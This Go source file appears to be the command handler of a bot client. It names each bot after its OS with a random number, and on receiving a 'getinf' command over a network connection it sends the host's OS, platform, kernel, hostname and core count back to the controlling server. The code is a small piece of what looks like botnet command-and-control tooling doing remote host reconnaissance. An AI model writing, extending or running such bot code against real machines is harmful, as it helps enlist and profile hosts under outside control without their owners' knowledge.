package botclientcommand

import (
	"fmt"
	"math/rand"
	"net"

	gi "github.com/matishsiao/goInfo"
)

//Getnick ...
func Getnick() string {
	temp := gi.GetInfo()
	rand := rand.Int63n(5000000)
	return fmt.Sprintf("%s_%d", temp.GoOS, rand)
}

func HandleCommand(c net.Conn, message string) {
	switch message {

	case "getinf":
		go getInf(c)
		break
	}
}

// SendToServer sends a message to server
func sendToServer(c net.Conn, msg string) (err error) {
	_, err = c.Write([]byte(msg))
	return
}

func getInf(c net.Conn) {
	info := gi.GetInfo()
	sendToServer(c, "OS->"+info.OS+"- Platform ->"+info.Platform+"- Kernel ->"+info.Kernel+"- Host ->"+info.Hostname+"- Core ->"+info.Core)
}
